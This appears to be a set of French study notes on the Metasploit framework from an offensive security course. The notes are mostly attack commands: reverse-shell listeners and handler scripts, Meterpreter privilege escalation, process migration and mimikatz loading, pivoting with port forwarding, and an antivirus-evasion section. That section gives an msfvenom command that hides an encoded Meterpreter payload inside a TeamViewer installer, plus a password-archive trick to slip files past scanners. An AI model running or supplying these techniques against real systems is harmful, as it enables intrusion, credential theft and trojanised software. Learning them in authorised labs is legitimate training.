Doit lancer la BD au lancement:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo msfdb init
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo msfconsole
db_status
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

créer  workspace

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
workspace -a <nom>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


# modules
auxiliary - utilitaires divers, énumération, ...
exploits - exploits
payloads - charges


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
show -h
show auxiliary
search type:auxiliary smb
use
back
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
show payloads
search type:payload windows meterpreter reverse tcp
set payload <id>
info
set <param> <value>
unset <param>
#transférer une donnée vers paramètre
services -p 445 --<param>
#-j pour lancer en arrière plan
run
#détecter vulnérabités selon résultats des modules
vulns
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


# Sessions
session arrière plan Ctrl + Z

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
#lister sesions
sessions -l
#interagir session
sessions -i <id>
#fermer
sessions -k <id>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Énumération
## Pre
nmap
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
db_nmap -p- 192.168.50.202
hosts
services
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
## post
meterpreter
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sysinfo
getuid
ps
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Pivot
lister interfaces et utiliser route
module multi/manage/autoroute
créer un proxy SOCKS auxiliary/server/socks_proxy

## meterpreter
port forward dans une sessions 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
portfwd add -l 3389 -p 3389 -r 172.16.5.200
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Script
liste de commandes comme

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
use exploit/multi/handler
set payload windows/meterpreter_reverse_https
set lhost 192.168.45.196
set lport 443
set autorunscript post/windows/manage/migrate
set exitonsession false
run -z -j
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

utiliser 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo msfconsole -r listener.rc
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 pour lancer avec script
Peut aussi être en ruby
plusieurs disponible dans /usr/share/metasploit-framework/scripts/resource
scripts utilisent contexte globale setg et unsetg

# Exploit module
Modules avec des exploits

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#rechercher un exploit
search apache nifi
use 0
info
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Charges
Staged: télécharges le reste de la charge, permet de réduire la taille contient "/" dans le nom
Non-Staged: tout en un
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
show payloads
search type:payload windows meterpreter reverse tcp
# changer l'OS de la cible pour voir d'autres charges
set target <id>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
## Charge externe
Créer un exploit staged ou non
utiliser multi/handler 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
use multi/handler
#la charge de notre exécutable
set payload windows/x64/shell/reverse_tcp
run
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 excuter l'exploit

# Meterpreter
Offre différentes fonctionnalités standardisés pour plusieurs OS
## Enumeration
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sysinfo
getuid
ps
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
## Téléverser
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
upload <from> <to>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
## Port forward
dans une sessions 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
portfwd add -l 3389 -p 3389 -r 172.16.5.200
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
## Post-exploitation
* ```getsystem``` pour élever privilèges
* ```migrate``` pour changer vers un autre processus
* ```execute -H -f notepad``` lance un notepad caché
* ```load kiwi``` pour utiliser mimikatz

# Encodeurs

# Modules intéressants
```shell-session
multi/recon/local_exploit_suggester
```

# Ajouter un module
chemins utilisé
```shell-session
/usr/share/metasploit-framework/modules/
~/.msf4/modules
```
Pour recharger
```shell
#Ajouter nouveaux modules au démarrage
msfconsole -m /usr/share/metasploit-framework/modules/
#Après lancement
loadpath /usr/share/metasploit-framework/modules/
#Autre?
reload_all
```

# Évitement d'anti-virus
## Encodeurs
Ne sont plus très efficaces
## Templates
Injecte notre charge dans un exécutable quelconque
* ```-x <exécutable>```  exécutable à utiliser
* ```-k``` Permet à l'exécutable de s'exécuter normalement. Une seconde fenêtre sera créé si lancé depuis un CLI
```shell-session
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
```
## Archiver
Archiver avec un mot de passe, l'AV ne peut lire le contenu mais pourrais retenir le fichier pour inspection manuelle.
Retirer l'extension .rar ou autre pour plus d'efficacité
```shell-session
rar a ~/test.rar -p ~/test.js
mv test.rar test
rar a test2.rar -p test
mv test2.rar test2
```
##  Packers